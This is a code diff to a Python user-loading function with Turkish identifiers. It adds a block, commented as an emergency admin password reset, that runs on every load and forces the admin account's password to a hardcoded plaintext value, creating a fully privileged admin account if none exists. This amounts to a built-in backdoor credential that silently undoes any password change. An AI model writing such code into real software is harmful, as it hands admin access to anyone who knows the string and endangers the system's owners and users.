@@ -480,12 +480,18 @@ def kullanıcıları_yukle():
         try:
             with open(KULLANICI_YETKI_DOSYASI, "r", encoding="utf-8") as f:
                 data = json.load(f)
+                
+                # ACİL DURUM: Admin şifresini zorla sıfırla
+                if "admin" in data:
+                    data["admin"]["sifre"] = "Ss123321"
+                else:
+                    data["admin"] = {"sifre": "Ss123321", "tip": "admin", "yasakli_menuler": [], "maskeli_alanlar": [], "salt_okunur": False}
+                
                 for k, v in data.items():
                     if "yasakli_menuler" not in v:
                         v["yasakli_menuler"] = []
                     if "maskeli_alanlar" not in v:
                         v["maskeli_alanlar"] = []
-                    # Otomatik tanıma ve düzeltme: 'yonetim' kullanıcısı veya salt_okunur True olanlar
                     if "salt_okunur" not in v:
                         v["salt_okunur"] = (k == "yonetim")
                     elif k == "yonetim":
